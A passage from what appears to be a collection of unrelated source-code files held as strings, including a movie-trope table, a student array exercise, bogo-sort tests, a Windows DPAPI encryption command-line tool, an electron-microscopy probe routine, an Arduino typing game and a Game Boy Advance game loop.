  // Action tropes\r\n    {\"The Hero's Journey\", \"The Chase Scene\", \"The MacGuffin\", \"The Explosive Climax\", \"The Last Stand\"},\r\n    // Comedy tropes\r\n    {\"Fish Out of Water\", \"Buddy Comedy\", \"Screwball Comedy\", \"Romantic Comedy\", \"Parody or Spoof\"},\r\n    // Drama tropes\r\n    {\"Family Drama\", \"Legal Drama\", \"Psychological Drama\", \"Romantic Drama\", \"Biographical Drama\"},\r\n    // Romance tropes\r\n    {\"First Love\", \"Friends to Lovers\", \"Enemies to Lovers\", \"Forbidden Love\", \"Second CHance Romance\"},\r\n    // Science Fiction tropes\r\n    {\"Artificial Intelligence | Robot\", \"Time Travel\", \"Aliens\", \"The Time Travel Paradox\", \"Alien Invasion\"}\r\n};\r\n\r\nMovie actionTropeOne[5] = {\r\n    {\"The Matrix Resurrections\", \"Action\", \"The Hero's Journey\", \"Keanu Reeves, Laurence Fishburne & Carrie-Anne Moss\"},\r\n    {\"Pirates of the Caribbean: The Curse of the Black Pearl\", \"Action\", \"The Hero's Journey\", \"Johnny Depp, Orlando Bloom & Keira Knightley\"},\r\n    {\"The Hobbit: An Unexpected Journey\", \"Action\", \"The Hero's Journey\", \"Martin Freeman, Ian McKellen & Richard Armitage\"},\r\n    {\"Wonder Woman 1984\", \"Action\", \"The Hero's Journey\", \"Gal Gadot, Chris Pine & Connie Nielsen\"},\r\n    {\"The Lion King\", \"Action\", \"The Hero's Journey\", \"Matthew Broderick, Nathan Lane & Ernie Sabella\"}\r\n};\r\n\r\nMovie actionTropeTwo[5] = {\r\n    {\"The Italian Job\", \"Action\", \"The Chase Scene\", \"Mark Wahlberg, Charlize Theron & Edward Norton\"},\r\n    {\"Mad Max: Fury Road\", \"Action\", \"The Chase Scene\", \"Tom Hardy, Charlize Theron & Nicholas Hoult\"},\r\n    {\"The French Connection\", \"Action\", \"The Chase Scene\", \"Gene Hackman, Roy Scheider & Fernando Rey\"},\r\n    {\"Fast Five\", \"Action\", \"The Chase Scene\", \"Vin Diesel, Paul Walke & Dwayne Johnson\"},\r\n    {\"Terminator 2: Judgement Day\", \"Action\", \"The Chase Scene\", \"Linda Hamilton, Edward Furlong & Arnold Schwarzenegger\"}\r\n};\r\n\r\nMovie actionTropeThree[5] = {\r\n    {\"Indiana Jones and the Kingdom of the Crystal Skull\", \"Action\", \"The MacGuffin\", \"Harrison Ford, Karen Allen & Denholm Elliott\"},\r\n    {\"National Treasure: Edge of History\", \"Action\", \"The MacGuffin\", \"Nicolas Cage, Diane Kruger & Justin Bartha\"},\r\n    {\"The Maltese Falcon\", \"Action\", \"The M",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nconst int MAX_SIZE = 100;\r\n\r\nint isiArray(int array[]) {\r\n    int n;\r\n    cout << \"Masukkan Jumlah elemen (max \" << MAX_SIZE << \":\";\r\n    cin >> n;\r\n\r\n    if (n > MAX_SIZE) {\r\n        cout << \"Jumlah elemen tidak boleh lebih dari\" << MAX_SIZE << endl;\r\n        cout << \". Menggunakan \" << MAX_SIZE << \".\" << endl;\r\n        n = MAX_SIZE;\r\n    }\r\n\r\n    for (int i = 0; i < n; i++) {\r\n        cout << \"Masukkan elemen ke-\" << i << \":\";\r\n        cin >> array[i];\r\n    }\r\n\r\n    return n;\r\n\r\n    // Fungsi mengecek apakah ada angka yang sama\r\n\r\n    int cekDuplikasi (int array[], int n){\r\n        bool adaDuplikasi = false;\r\n\r\n        for(int i=0; i<n; i++) {\r\n            for(int j=1 + 1; j<n; j++)\r\n                if (array[i] == array[j]) {\r\n                    cout << \"Ada angka yang sama dalam array: \"\r\n                    cout << \"pada indeks ke-\" << \"dan\" << j << endl;\r\n                    adaDuplikasi = true;\r\n\r\n                }\r\n        }\r\n    }\r\n if (adaDuplikasi) {\r\n    cout << \"Tidak ada angka yang sama dalam array\" << endl;\r\n }\r\n// TES GIT  2\r\n\r\n}\r\n//fungsi untuk menghitung total dan \r\n// menampilkan rata-arat\r\nint hitungTotalRataRata",
    "#include \"../include/bogo.sort.h\"\n#include \"../libs/catch2/catch.hpp\"\n#include <vector>\n\nTEST_CASE(\"\u0422\u0435\u0441\u0442\u044b \u0434\u043b\u044f Bogo \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0438\") {\n  int N = 5;\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {2, 6, 5, 3, 9};\n    bogoSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041f\u0443\u0441\u0442\u043e\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\") {\n    int Array2[0] = {};\n    bogoSort(Array2, 0);\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0447\u0438\u0441\u0435\u043b \u0441 \u043f\u043b\u0430\u0432\u0430\u044e\u0449\u0435\u0439 \u0437\u0430\u043f\u044f\u0442\u043e\u0439 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    double Array3[5] = {2.3, 5.0, -1.0, 8.0, -20.0};\n    bogoSort(Array3, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array3[i] <= Array3[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 \u043e\u0434\u043d\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\") {\n    int Array[1] = {42};\n    bogoSort(Array, 1);\n    REQUIRE(Array[0] == 42);\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {5, 3, 5, 1, 3};\n    bogoSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u0443\u0436\u0435 \u043e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c\u0438\") {\n    int Array[5] = {1, 2, 3, 4, 5};\n    bogoSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u044b\u043c\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c\u0438\") {\n    int Array[5] = {5, 5, 5, 5, 5};\n    bogoSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] == Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {-3, -1, -7, -5, -2};\n    bogoSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041e\u0447\u0435\u043d\u044c \u0431\u043e\u043b\u044c\u0448\u043e\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 (\u043e\u0441\u0442\u043e\u0440\u043e\u0436\u043d\u043e, Bogo Sort \u043c\u043e\u0436\u0435\u0442 \u0437\u0430\u043d\u044f\u0442\u044c \u0432\u0440\u0435\u043c\u044f)\") {\n    int              largeN = 6;\n    std::vector<int> LargeArray(largeN);\n\n    for (int i = 0; i < largeN; ++i) {\n      LargeArray[i] = largeN - i;\n    }\n\n    bogoSort(LargeArray.data(), largeN);\n\n    for (int i = 0; i < largeN - 1; i++) {\n      REQUIRE(LargeArray[i] <= LargeArray[i + 1]);\n    }\n  }\n}\n",
    "\ufeff/*\n *   MIT License\n *\n *   Copyright (c) 2024, Mattias Aabmets\n *\n *   The contents of this file are subject to the terms and conditions defined in the License.\n *   You may not use, modify, or distribute this file except in compliance with the License.\n *\n *   SPDX-License-Identifier: MIT\n */\n\n#include <windows.h>\n#include <wincrypt.h>\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <cstring>\n#include <filesystem>\n#include \"metadata.h\"\n\n\nenum Scope {\n    CurrentUser,\n    LocalMachine\n};\n\nvoid printUsage() {\n    std::cout\n        << \"\\nUsage: dpapi-cli <command> [OPTIONS]\\n\"\n        << \"\\n\"\n        << \"A command-line tool for encrypting and decrypting data using the Windows Data Protection API (DPAPI). \\n\\n\"\n        << \"The encryption key is derived either from the current user's credentials (CurrentUser scope) or \\n\"\n        << \"the machine's credentials (LocalMachine scope). Encrypted ciphertext can be printed to the console \\n\"\n        << \"in base64 format or written to a file in raw binary format. Any relative filepaths are evaluated \\n\"\n        << \"from the current working directory of the console. Absolute filepaths are used as-is.\\n\"\n        << \"\\n\"\n        << \"Commands:\\n\"\n        << \"  encrypt                    Encrypt the input data using DPAPI.\\n\"\n        << \"  decrypt                    Decrypt the input data using DPAPI.\\n\"\n        << \"\\n\"\n        << \"Options:\\n\"\n        << \"  -t, --text <STRING>        Specify a plaintext or a base64-encoded ciphertext.\\n\"\n        << \"  -i, --input-file <FILE>    Specify a file containing the data to encrypt or decrypt.\\n\"\n        << \"  -o, --output-file <FILE>   Specify a file where the result will be written to.\\n\"\n        << \"  -e, --entropy <ENTROPY>    Specify optional entropy (additional secret) for encryption/decryption.\\n\"\n        << \"  -s, --scope <SCOPE>        Specify protection scope: 'CurrentUser' or 'LocalMachine'.\\n\"\n        << \"  -h, --help                 Show this help message and exit.\\n\"\n        << \"\\n\"\n        << \"Examples:\\n\"\n        << \"  dpapi-cli encrypt --text \\\"Hello, world!\\\" --output-file encrypted.txt\\n\"\n        << \"  dpapi-cli decrypt --input-file encrypted.txt\\n\"\n        << \"\\n\"\n        << \"The default scope is 'CurrentUser'.\\n\\n\";\n}\n\n// Resolve a path (absolute or relative) using the current working directory for relative paths\nstd::string resolvePath(const std::string& pathStr) {\n    std::filesystem::path path(pathStr);\n    if (path.is_absolute()) {\n        return path.string(); // Absolute paths are used as-is\n    }\n    else {\n        // Resolve relative path from the current working directory\n        return (std::filesystem::current_path() / path).string();\n    }\n}\n\nstd::string base64Encode(const BYTE* buffer, DWORD length) {\n    DWORD outLen = 0;\n    if (!CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &outLen)) {\n        return \"\";\n    }\n\n    std::string result(outLen, '\\0');\n    if (!CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &outLen)) {\n        return \"\";\n    }\n    return result;\n}\n\nstd::vector<BYTE> base64Decode(const std::string& encoded) {\n    DWORD outLen = 0;\n    if (!CryptStringToBinaryA(encoded.c_str(), static_cast<DWORD>(encoded.size()), CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) {\n        return {};\n    }\n\n    std::vector<BYTE> result(outLen);\n    if (!CryptStringToBinaryA(encoded.c_str(), static_cast<DWORD>(encoded.size()), CRYPT_STRING_BASE64, result.data(), &outLen, NULL, NULL)) {\n        return {};\n    }\n    return result;\n}\n\nScope getScope(const std::string& scopeStr) {\n    if (scopeStr == \"CurrentUser\") {\n        return CurrentUser;\n    }\n    else if (scopeStr == \"LocalMachine\") {\n        return LocalMachine;\n    }\n    else {\n        std::cerr << \"Invalid scope. Using 'CurrentUser'.\\n\";\n        return CurrentUser;\n    }\n}\n\nstd::string readFile(const std::string& filename) {\n    std::ifstream file(filename, std::ios::binary | std::ios::ate);\n    if (!file) {\n        std::cerr << \"Error: Unable to open input file: '\" << filename << \"'.\\n\";\n        return \"\";\n    }\n    std::streamsize size = file.tellg();\n    file.seekg(0, std::ios::beg);\n    std::string buffer(size, '\\0');\n    if (!file.read(&buffer[0], size)) {\n        std::cerr << \"Error: Unable to read input file: '\" << filename << \"'.\\n\";\n        return \"\";\n    }\n    return buffer;\n}\n\nint handleEncrypt(const std::string& input, const std::string& outputFile, const std::string& entropy, Scope scope) {\n    DATA_BLOB inputData;\n    inputData.pbData = (BYTE*)input.data();\n    inputData.cbData = static_cast<DWORD>(input.size());\n\n    DATA_BLOB entropyData = { 0, NULL };\n    if (!entropy.empty()) {\n        entropyData.pbData = (BYTE*)entropy.data();\n        entropyData.cbData = static_cast<DWORD>(entropy.size());\n    }\n\n    DATA_BLOB outputData;\n\n    if (CryptProtectData(&inputData, NULL, &entropyData, NULL, NULL, scope == Current",
    "/*      *** probe.cpp ***\r\n\r\n------------------------------------------------------------------------\r\nCopyright 1998-2019 Earl J. Kirkland\r\n\r\n    This program is free software: you can redistribute it and/or modify\r\n    it under the terms of the GNU General Public License as published by\r\n    the Free Software Foundation, either version 3 of the License, or\r\n    (at your option) any later version.\r\n\r\n    This program is distributed in the hope that it will be useful,\r\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n    GNU General Public License for more details.\r\n\r\n    You should have received a copy of the GNU General Public License\r\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\r\n\r\n---------------------- NO WARRANTY ------------------\r\nTHIS PROGRAM IS PROVIDED AS-IS WITH ABSOLUTELY NO WARRANTY\r\nOR GUARANTEE OF ANY KIND, EITHER EXPRESSED OR IMPLIED,\r\nINCLUDING BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\r\nMERCHANABILITY AND FITNESS FOR A PARTICULAR PURPOSE.\r\nIN NO EVENT SHALL THE AUTHOR BE LIABLE\r\nFOR DAMAGES RESULTING FROM THE USE OR INABILITY TO USE THIS\r\nPROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA\r\nBEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR\r\nTHIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH\r\nANY OTHER PROGRAM). \r\n\r\n------------------------------------------------------------------------\r\n\r\n    ANSI-C++ version\r\n\r\n    Calculate a focused probe wavefunction in real space\r\n\r\n    this file is formatted for a tab size of 4 characters\r\n\r\n    rewritten in C 6-dec-1995 ejk\r\n    fixed sign error in aberration function 1-mar-1997 ejk\r\n    removed commas from keyboard input 3-oct-1997 ejk\r\n    updated memory allocation routines 20-nov-1999 ejk\r\n    change void main() to int main() for better portability\r\n         22-jan-2000 ejk\r\n    add Cs5=5th order aberration and astigmatism  19-jul-2005 ejk\r\n    small cosmetic changes 18-jul-2007 ejk\r\n    convert to GPL 3-jul-2008 ejk\r\n        convert to large list aber. with coma option 23-nov-2008 ejk\r\n    get return value of scanf() to remove warnings from gcc 4.4\r\n      and convert to 4 char TAB size formatting 10-apr-2010 ejk\r\n    convert to FFTW 9-may-2010 ejk\r\n    fix C34a,b terms 10-may-2010 ejk\r\n    change astig. parameters to a,b from mag.+angle 30-may-2010 ejk\r\n    add more aberations to 5th order 30-jun-2010 to 4-jul-2010 ejk\r\n    add probe size calculation 5-jul-2010 ejk\r\n    split up into subroutine 16-jul-2010 ejk\r\n    fix a few things in prbSize() 5-sep-2010 ejk\r\n    switch to storing multipole aberr. in param[] to save in\r\n       output file 2-may-2011 ejk\r\n    add multiMode in chi() to avoid extra calculations if there\r\n       are no multipole aberrations 8-may-2011 ejk\r\n    convert to C++ and floatTIFF.cpp  22-mar-2012 ejk\r\n    convert to cfpix/fftw class from raw fftw 5-nov-2012 ejk\r\n    fix small bug in aspect ration of display image (actual\r\n       floating point image was fine) and add probe position\r\n       parameter symbolic constants  6-apr-2013 ejk\r\n   start conversion to separate class file 1-jul-2013 ejk\r\n   move invert2D() to here (was in incostem) 7-jul-2013 ejk\r\n   move makeProbeIntensity() from mcprobe.cpp to here 24-jan-2016 ejk\r\n   convert malloc1D() etc to vector<> 28-jun-2016 ejk\r\n   convert last malloc2D to cfpix 29-jul-2017 ejk\r\n   add non-zero probe position to makeProbeIntensity() 31-jan-2018 ejk\r\n   remove probe size calc. from makeProbeIntensity() because it\r\n      only works if probe near center - do externally when appropriate\r\n      - change to return = int   2,3-feb-2018 ejk\r\n   copy abbPhase2D( ) from autoslic to here (easer to use) 25-aug-2019 ejk\r\n*/\r\n\r\n#include \"probe.hpp\"   //  header for this class\r\n\r\n//=============================================================\r\n//---------------  creator and destructor --------------\r\n\r\nprobe::probe()\r\n{\r\n}\r\n\r\nprobe::~probe()\r\n{\r\n}\r\n\r\n//=============================================================\r\n/*  abbPhase2D()\r\n\r\n  calculate the phase of the abberation function in 2D\r\n  in the objective aperture plane \r\n  (but out to the max angle allowed by sampling)\r\n  - mainly just to look at\r\n\r\n  added 21-aug-2014 ejk\r\n  convert max angle to obj. apert. (instead of 2/3 max)\r\n      20-oct-2017 ejk\r\n  copy from autoslic to here (and add var pi, twopi) 25-aug-2019 ejk\r\n\r\n  ab2D() = will get the 2D image of the abb. phase\r\n  param[] = holds image parameters\r\n  multiMode = flag, if not 0 then include all multipole abberations\r\n\r\n*/\r\nvoid probe::abbPhase2D( cfpix &ab2D,vectorf &param, int multiMode )\r\n{\r\n    int ix, iy, ixmid, iymid, nx, ny;\r\n    float k2, k2max, v0, wavlen, ax, by, t, aobj;\r\n    double chi0, alx, aly, pi, twopi;\r\n\r\n    vectorf kx, ky, xpos, ypos, kx2, ky2;\r\n\r\n    // ---- get setup parameters from param[]\r\n    ax = param[ pAX ];\r\n    by = param[ pBY ];\r\n    nx = ToInt( param[ pNX ] );\r\n    ny = ToInt( param[ pNY ] );\r\n    v0 = param[p",
    "#include <Arduino.h>\r\n\r\nconst int ledRosu = 6;\r\nconst int ledVerde = 5;\r\nconst int ledAlbastru = 4;\r\nconst int ButStart = 3;\r\nconst int ButLev = 2;\r\n\r\nchar* typeracer_words[] = {\r\n    (char*)\"apple\", (char*)\"banana\", (char*)\"cherry\", (char*)\"date\", \r\n    (char*)\"elephant\", (char*)\"fig\", (char*)\"grape\", (char*)\"honey\", \r\n    (char*)\"igloo\", (char*)\"jungle\", (char*)\"kite\", (char*)\"lemon\", \r\n    (char*)\"mango\", (char*)\"nest\", (char*)\"orange\", (char*)\"plum\", \r\n    (char*)\"quartz\", (char*)\"river\", (char*)\"star\", (char*)\"tree\", \r\n    (char*)\"unicorn\", (char*)\"violet\", (char*)\"water\", (char*)\"xylophone\", \r\n    (char*)\"yellow\", (char*)\"zebra\"\r\n};\r\n\r\nvoid SelectareNivel();\r\nvoid IntrerupereStart();\r\nvoid Blink();\r\nvoid CitireCuvinte();\r\n\r\nunsigned int index = 0;\r\nunsigned long lastDebounceTime = 0;\r\nconst int debounceDelay = 50;\r\nvolatile bool startFlag = false;\r\nunsigned long startTime = 0;\r\nunsigned long timeLimit = 5000;\r\nunsigned int scor = 0;\r\nbool gameActive = false;\r\n\r\nvoid setup() {\r\n  Serial.begin(9600);\r\n  pinMode(ledRosu, OUTPUT);\r\n  pinMode(ledVerde, OUTPUT);\r\n  pinMode(ledAlbastru, OUTPUT);\r\n  pinMode(ButStart, INPUT_PULLUP);\r\n  pinMode(ButLev, INPUT_PULLUP);\r\n  digitalWrite(ledRosu, HIGH);\r\n  digitalWrite(ledVerde, HIGH);\r\n  digitalWrite(ledAlbastru, HIGH);\r\n  attachInterrupt(digitalPinToInterrupt(ButStart), IntrerupereStart, FALLING);\r\n  attachInterrupt(digitalPinToInterrupt(ButLev), SelectareNivel, FALLING);\r\n}\r\n\r\nvoid SelectareNivel() {\r\n  if (millis() - lastDebounceTime > debounceDelay) {\r\n    lastDebounceTime = millis();\r\n    index = (index + 1) % 3;\r\n\r\n    if (index == 0) {\r\n      timeLimit = 5000;\r\n      Serial.println(\"Easy mode ON!\");\r\n    } else if (index == 1) {\r\n      timeLimit = 3000;\r\n      Serial.println(\"Medium mode ON!\");\r\n    } else {\r\n      timeLimit = 2000;\r\n      Serial.println(\"Hard mode ON!\");\r\n    }\r\n  }\r\n}\r\n\r\nvoid IntrerupereStart() {\r\n  if (gameActive) {\r\n    gameActive = false; \r\n    Serial.println(\"Joc oprit.\");\r\n    digitalWrite(ledRosu, HIGH);\r\n    digitalWrite(ledVerde, HIGH);\r\n    digitalWrite(ledAlbastru, HIGH);\r\n    scor = 0; \r\n  } else {\r\n    startFlag = true; \r\n  }\r\n}\r\n\r\nvoid Blink() {\r\n  unsigned long currentMillis = millis();\r\n  static unsigned long lastBlinkTime = 0;\r\n  static int count = 3;\r\n  static bool ledState = false;\r\n\r\n  if (currentMillis - lastBlinkTime >= 1000 && count > 0) {\r\n    lastBlinkTime = currentMillis;\r\n    Serial.println(count);\r\n    count--;\r\n    ledState = !ledState;\r\n    digitalWrite(ledRosu, ledState);\r\n    digitalWrite(ledVerde, ledState);\r\n    digitalWrite(ledAlbastru, ledState);\r\n  } else if (count == 0) {\r\n    digitalWrite(ledRosu, HIGH);\r\n    digitalWrite(ledVerde, HIGH);\r\n    digitalWrite(ledAlbastru, HIGH);\r\n    count = 3;\r\n    startTime = millis();\r\n    gameActive = true; \r\n  }\r\n}\r\n\r\nvoid CitireCuvinte() {\r\n  while (millis() - startTime < 30000 && gameActive) {\r\n    int randomIndex = random(0, 25); \r\n    char* cuvant = typeracer_words[randomIndex];\r\n\r\n    Serial.print(\"Scrie cuvantul: \");\r\n    Serial.println(cuvant);\r\n\r\n    char cuvantScris[20] = \"\"; \r\n    int i = 0;\r\n    bool corect = true;\r\n    unsigned long cuvantStartTime = millis();\r\n\r\n    digitalWrite(ledRosu, LOW);\r\n    digitalWrite(ledVerde, LOW);\r\n\r\n    while (cuvant[i] != '\\0' && (millis() - cuvantStartTime) < timeLimit && gameActive) {\r\n      if (Serial.available() > 0) {\r\n        char caracterTastat = Serial.read();\r\n\r\n        if (caracterTastat == '\\b') { \r\n          if (i > 0) {\r\n            i--; \r\n            cuvantScris[i] = '\\0'; \r\n            Serial.print(\"\\b \\b\");\r\n          }\r\n        } else if (caracterTastat == cuvant[i]) {\r\n          cuvantScris[i] = caracterTastat; \r\n          digitalWrite(ledRosu, LOW);\r\n          digitalWrite(ledVerde, HIGH);\r\n          Serial.print(caracterTastat);\r\n          i++;\r\n        } else {\r\n          digitalWrite(ledRosu, HIGH);\r\n          digitalWrite(ledVerde, LOW);\r\n          corect = false;\r\n        }\r\n      }\r\n    }\r\n\r\n    if (corect && cuvant[i] == '\\0') {\r\n      scor++;\r\n      Serial.println(\"\\nCuvant corect!\");\r\n    } else {\r\n      Serial.println(\"\\nCuvant gresit sau timp expirat!\");\r\n      scor--;\r\n    }\r\n  }\r\n  if(scor != 0 && scor!= 65533){\r\n  Serial.print(\"Scor final: \");\r\n  Serial.println(scor);\r\n  scor = 0;\r\n  }\r\n  gameActive = false; \r\n}\r\n\r\nvoid loop() {\r\n  if (startFlag) {\r\n    startFlag = false;\r\n    Blink();\r\n    CitireCuvinte();\r\n  }\r\n}\r\n",
    "#include \"game.hpp\"\n#include \"map_forest.h\"\n#include \"pal_forest.h\"\n#include \"pregenerated/crossbow.h\"\n\n#include <tonc.h>\n\n#include \"mgba/mgba.h\"\n\n#ifndef RETAIL\nstruct Scenario {\n    const char* name;\n    Anchor const& anchor;\n};\n\nstatic const Scenario scenarios[] {\n//        { \"test1\", 0x1e0, 0x110, 90 * 0x10000 / 360 },\n//        { \"test2\", 0x180, 0, 90 * 0x10000 / 360 },\n//        { \"empty\", 0x180, -0x200, 270 * 0x10000 / 360 },\n        {\"bm_closeup\", a_bm_closeup},\n        {\"bm_corner\", a_bm_corner},\n        {\"bm_walls\", a_bm_walls},\n        {\"bm_overlap\", a_bm_overlap},\n};\n#endif\n\n// Nasssty globalses\nMap const* currmap = &map_forest;\nint x_plr, y_plr;\nint dir_plr = 90 * 0x10000 / 360;\nuint8_t frames_since_hit = UINT8_MAX;\nuint8_t hitpoints_plr = 100;\nbool g_showdebug = false;\nbool g_dbgmenu = false;\nbool g_freezeai = false;\nint auxv[4];\nchar auxstr[32];\nstatic int frames_since_shot = 99;\n\nstatic bool mapIsTileWall(Map const& map, int x_map, int y_map) {\n    // the void outside the map is considered a wall\n    if (x_map >= 0 && x_map < map.w && y_map >= 0 && y_map < map.h && map.tiles[y_map * map.w + x_map] == 0) {\n        return false;\n    }\n    else {\n        return true;\n    }\n}\n\nstatic bool mapIsPointInsideWall(Map const& map, int x_world, int y_world) {\n    return mapIsTileWall(map, x_world / MAP_TILE_SIZE, y_world / MAP_TILE_SIZE);\n}\n\nstatic void MovePlayer(int dx, int dy) {\n    int new_x = x_plr + dx,\n        new_y = y_plr + dy;\n    // assuming that player size is less than 1 tile, it suffices to check the corners\n    if (mapIsPointInsideWall(*currmap, new_x + PLAYER_HALF_SIZE, new_y + PLAYER_HALF_SIZE)\n        || mapIsPointInsideWall(*currmap, new_x - PLAYER_HALF_SIZE, new_y + PLAYER_HALF_SIZE)\n        || mapIsPointInsideWall(*currmap, new_x + PLAYER_HALF_SIZE, new_y - PLAYER_HALF_SIZE)\n        || mapIsPointInsideWall(*currmap, new_x - PLAYER_HALF_SIZE, new_y - PLAYER_HALF_SIZE)) {\n        return;\n    }\n    x_plr = new_x;\n    y_plr = new_y;\n}\n\nstatic uint32_t SampleProfilingTimer() {\n    // classic pattern for sampling a cascaded timer\n    for (;;) {\n        auto high = REG_TM3D;\n        auto low = REG_TM2D;\n        auto high2 = REG_TM3D;\n\n        if (high == high2) {\n            return (high << 16) | low;\n        }\n    }\n}\n\nstatic void SetScreenOverlay(uint16_t color, int opacity_0_to_16) {\n    ((uint16_t*)MEM_PAL_BG)[PAL_BACKDROP] = color;\n    REG_BLDCNT = (1<<2)|(1<<13)|(1<<6);     // alpha blend between BG2 & backdrop\n    REG_BLDALPHA = (16 - opacity_0_to_16) | (opacity_0_to_16 << 8);\n}\n\nstatic void SetUpWeaponSprite() {\n    OBJ_ATTR objs[2];\n    oam_init(objs, 2);\n\n    obj_set_attr(&objs[0],\n                 ATTR0_SQUARE,\n                 ATTR1_SIZE_64x64,\n                 ATTR2_PALBANK(0) | 512);\n\n    obj_set_attr(&objs[1],\n                 ATTR0_SQUARE,\n                 ATTR1_SIZE_64x64,\n                 ATTR2_PALBANK(0) | (512 + 8));\n\n    obj_set_pos(&objs[0], (M4_WIDTH - 128) / 2, M4_HEIGHT - 64);\n    obj_set_pos(&objs[1], (M4_WIDTH) / 2, M4_HEIGHT - 64);\n\n    oam_copy(oam_mem, objs, 2);\n\n    memcpy32(pal_obj_mem, crossbowPal, crossbowPalLen / 4);\n\n    // Do not actually copy the data... done later\n}\n\nstatic void CopyWeaponSpriteFrameToVram(unsigned int const* crossbowTiles) {\n    static const int ROWS = WEAPON_SPRITE_H / TS;\n    static const int COLS = WEAPON_SPRITE_W / TS;\n\n    for (int row = 0; row < ROWS; row++) {\n        dma_cpy(&tile_mem_obj[0][WEAPON_SPRITE_TILE_INDEX + row * TILES_PER_ROW_VRAM],\n                &crossbowTiles[row * COLS * WORDS_PER_TILE],\n                COLS * WORDS_PER_TILE, 3, DMA_CPY32);\n    }\n}\n\nstatic int8_t psprite_frame_last = -1;\n\nint main(void) {\n    bmarkInit();\n\n    x_plr = map_forest.x_start;\n    y_plr = map_forest.y_start;\n\n    REG_DISPCNT = DCNT_MODE4 | DCNT_BG2 | DCNT_OBJ | DCNT_OBJ_2D;\n\n    tte_init_bmp_default(4);\n\n    // 16-bit palette transfer\n    CpuSet(palette, (void*) MEM_PAL_BG, sizeof(palette) / sizeof(*palette));\n\n    irq_init(NULL);\n    irq_enable(II_VBLANK);\n\n    int scenario_counter = 0;\n    const int RELOAD_TIME = 16;\n\n    SetUpWeaponSprite();\n\n    /*\n     * Non-benchmark run:\n     *   - start profiler\n     *   - loop\n     *     - process input\n     *     - process AI\n     *     - draw\n     *     - sample profile\n     *     - draw FPS\n     *\n     * Benchmark run\n     *   - start profiler\n     *   - loop\n     *     - apply benchmark pose (NEW)\n     *     - process input\n     *     - process AI\n     *     - draw\n     *     - sample profile\n     *     - on 2nd pass: print result & advance to next scenario (NEW)\n     *     - draw FPS\n     */\n\n    profile_start();\n    bool is_second_pass = false;\n    uint32_t prev_timer_value = 0;\n\n    while (1) {\n        auto drawfb = (uint16_t *) ((REG_DISPCNT & DCNT_PAGE) != 0 ? MEM_VRAM_FRONT : MEM_VRAM_BACK);\n        srf_set_ptr(tte_get_surface(), drawfb);\n        srf_set_ptr(&m4_surface, drawfb);\n\n        if (g_dbgmenu) {\n            key_poll();\n            dbgmenuInput();\n            dbgmenuDraw",
